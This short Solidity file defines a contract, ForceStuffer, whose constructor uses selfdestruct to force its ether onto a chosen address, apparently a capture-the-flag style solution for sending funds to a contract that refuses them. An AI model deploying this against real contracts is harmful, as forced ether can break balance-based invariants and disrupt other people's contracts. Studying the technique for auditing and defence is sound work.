// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceStuffer {
  constructor(address payable forceAddr) payable {
    selfdestruct(forceAddr);
  }
}
